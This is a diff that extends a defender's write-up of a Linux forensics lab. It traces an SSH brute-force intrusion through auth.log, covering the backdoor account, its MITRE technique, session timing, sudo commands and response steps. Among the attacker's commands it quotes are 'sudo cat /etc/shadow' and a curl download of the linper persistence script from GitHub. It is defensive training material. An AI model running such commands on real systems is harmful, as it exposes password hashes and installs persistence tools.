@@ -129,4 +129,66 @@ As told before, `wtmp` is a binary file so we use different tools suhc as `last`
 
 	**ANSWER: `37`**
 
-5. The attacker 
+5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+
+	Attackers often create new user accounts for persistence. With this attackers maintain the access or control over the compromised system for an extended period of time, even after initial access has been achieved. 
+	
+	In order to check this we look the keywords `useradd`, `usermod`, and `groupadd` within the auth.log file.
+	
+	- useradd -> Indicates the creation of a new user.
+	- usermod -> Indicates the modification of the user permissions or groups
+	- groupadd -> Indicates the creation of a new group.
+
+	![[Creation of new user.png]]
+
+	The information displayed shows the creation of a new group and user named `cyberjunkie`, who subsequently added to the `sudo` group for elevated privileges. In this way the user created by the attacker can execute commands with elevated privileges by prefixing the command with `sudo`. 
+
+	The term "sudo" stands for "superuser do" and **allows authorized users to execute specific commands as the root temporarily**.
+
+	 **ANSWER: `cyberjunkie`**
+
+6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+
+	The MITRE ATT&CK is a **framework that categorizes various tactics and techniques used by attackers**. In this case we understand that the new account created as a method of achieving persistence, so using the *Enterprise Matrix* and locate under "Persistence" the "Create Account" technique, detailed below as T1136
+
+	![[Enterprise Matrix - Create Account.png]]
+
+	Let's go little deeper, looking at the sub-techniques. In this case the account was a local account on the compromised host therefore the sub-technique is T1136.001 as shows below.
+
+	![[Create Account - Subtechniques.png]]
+
+	**ANSWER: `T1136.001`**
+
+7. What time did the attacker's first SSH session end according to auth.log?
+
+	In question 4 we found the **session ID was 37**. With this information we can search when the session 37 was closed, in this case at 06:37:24, as we can see in the following image.
+
+	![[Time - Session 37 closed.png]]
+
+	**ANSWER: `2024-03-06 06:37:24`**
+
+8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+
+	Even though `auth.log` isn't primarily used to track command execution, commands run with `sudo` are logged since they require authentication. In the filter information we see two execution with sudo.
+
+	![[Sudo execution commands.png]]
+
+	The first used of `sudo` was to view the content of the file `shadow` which **contains the hashes of the passwords of the users of the system**, so the system passwords could have been compromised. The full command was: `sudo cat /etc/shadow`
+	
+	The other executed command download a script form GitHub repository. The full command was: `curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`.  This action indicates the attacker's intention to deploy additional tools or malware for further exploitation or persistence. 
+
+	**ANSWER: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`**
+
+# Incident Response
+Briefly summarizing the incident, the system was compromised by a brute force attack from IP 65.2.161.68 using tools like hydra or brutus. The attacker access the system as root, created a new user called cyberjunkie and execute commands using sudo.
+
+Once the analysis is done, we can respond to the incident follow the following series of steps:
+
+1. Isolate the system form the network to prevent further damage or spread.
+2. Block or remove compromised accounts.
+3. Delete the account created by the attacker (cyberjunkie)
+4. Delete the malicious script
+5. Restore the system from a secure backup
+6. Change all system passwords because the were compromised when the attacker read the shadow file, which contained the password hashes.
+7. Apply MFA if possible
+8. Configure an IDS system and conduct periodic security audits.
